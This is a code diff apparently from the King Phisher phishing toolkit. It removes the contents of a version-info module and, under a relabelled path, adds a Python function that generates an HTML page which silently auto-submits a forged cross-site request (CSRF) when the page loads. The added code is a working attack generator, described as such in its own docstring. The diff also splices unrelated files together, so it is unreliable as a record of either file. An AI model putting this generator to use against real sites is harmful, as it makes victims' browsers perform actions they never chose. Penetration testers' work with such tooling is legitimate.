@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #
-#  king_phisher/version.py
+#  king_phisher/server/pages.py
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions are
@@ -30,27 +30,33 @@
 #  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 
-import collections
+import cgi
+import markupsafe
 
-version_info = collections.namedtuple('version_info', ['major', 'minor', 'micro'])(0, 1, 7)
-"""A tuple representing the version information in the format ('major', 'minor', 'micro')"""
+from king_phisher import utilities
 
-version_label = 'beta'
-"""A version lable such as alpha or beta."""
-version = "{0}.{1}.{2}".format(version_info.major, version_info.minor, version_info.micro)
-"""A string representing the full version information."""
+def make_csrf_page(url, params, method='POST'):
+	"""
+	A Jinja function which will create an HTML page that will automatically
+	perform a CSRF attack against another page.
 
-# distutils_version is compatible with distutils.version classes
-distutils_version = version
-"""A string sutiable for being parsed by :py:mod:`distutils.version` classes."""
+	:param str url: The URL to use as the form action.
+	:param dict params: The parameters to send in the forged request.
+	:param str method: The HTTP method to use when submitting the form.
+	"""
+	escape = lambda s: cgi.escape(s, quote=True)
+	form_id = utilities.random_string(12)
 
-if version_label:
-	version += '-' + version_label
-	distutils_version += version_label[0]
-	if version_label[-1].isdigit():
-		distutils_version += version_label[-1]
-	else:
-		distutils_version += '0'
+	page = []
+	page.append('<!DOCTYPE html>')
+	page.append('<html lang="en-US">')
+	page.append("  <body onload=\"document.getElementById(\'{0}\').submit()\">".format(form_id))
+	page.append("    <form id=\"{0}\" action=\"{1}\" method=\"{2}\">".format(form_id, escape(url), escape(method)))
+	for key, value in params.items():
+		page.append("      <input type=\"hidden\" name=\"{0}\" value=\"{1}\" />".format(escape(key), escape(value)))
+	page.append('    </form>')
+	page.append('  </body>')
+	page.append('</html>')
 
-rpc_api_version = 2
-"""An integer representing the current version of the RPC API, used for compatibility checks."""
+	page = '\n'.join(page)
+	return markupsafe.Markup(page)
